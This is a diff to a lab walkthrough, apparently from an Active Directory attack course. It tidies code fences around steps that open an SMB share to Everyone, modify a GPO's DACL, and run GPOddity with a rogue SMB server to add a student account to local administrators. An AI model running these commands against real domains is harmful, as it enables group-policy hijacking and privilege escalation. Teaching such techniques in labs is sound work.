@@ -92,11 +92,12 @@ cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
 ![NTLM Relay](../assets/gpoddity-1.png)
           
 From a command prompt (Run as Administrator) on the student VM, run the following commands to allow '**Everyone**' full permission on the **stdx-gp share**:
-```batch
-net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
 
+```cmd
+net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
 icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
 ```
+
 ![NTLM Relay](../assets/gpoddity-2.png)
           
 Verify if the **gPCfileSysPath** has been modified for the **DevOps Policy**. Run the following **PowerView command**:
@@ -157,7 +158,7 @@ write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 Now malicious GPO template can injected through GPOddity - [https://github.com/synacktiv/GPOddity](https://github.com/synacktiv/GPOddity)
 
 ##### In linux machine change to the tool directory
-```md
+```bash
 cd /mnt/c/AD/Tools/GPOddity
 # Use the GPOddity
 sudo python3 gpoddity.py --domain dollarcorp.moneycorp.local --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --username studentx --password xyzdsfsddsf --dc-ip 172.16.2.1 --command "net localgroup administrators studentx  /add" --rogue-smbserver-ip 172.16.100.x --rogue-smbserver-share 'std-anything' --smb-mode none 
